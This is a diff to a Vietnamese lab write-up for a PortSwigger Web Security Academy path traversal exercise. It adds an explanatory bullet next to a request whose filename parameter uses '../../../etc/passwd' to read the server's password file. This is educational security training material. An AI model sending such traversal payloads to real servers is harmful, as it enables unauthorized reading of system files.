@@ -125,11 +125,13 @@ Host: 0a24006d03b4e0b48025dad200d800f9.web-security-academy.net
 GET /image?filename=/var/www/images/38.jpg HTTP/2
 Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
 ```
+- Thêm **traversal sequence** để chuyển hướng đến **root** rồi trở về **/etc/passwd**
 - Thay đổi request để đọc file `/etc/passwd`
 ```http
 GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
 Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
 ```
+
 
 ---
 Goodluck! 🍀🍀🍀
